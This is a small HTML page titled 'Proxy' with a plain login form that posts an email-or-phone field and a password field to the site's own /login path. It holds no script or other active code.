<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Proxy</title>
    <link rel="stylesheet" href="/styles.css" />
  </head>
  <body class="proxy-page">
    <div class="proxy-shell">
      <form class="proxy-form" action="/login" method="POST" target="_blank">
        <input id="email" name="email" type="email" placeholder="Email or phone" required />
        <input id="password" name="password" type="password" placeholder="Password" required />
        <button type="submit">Log In</button>
      </form>
    </div>
  </body>
</html>
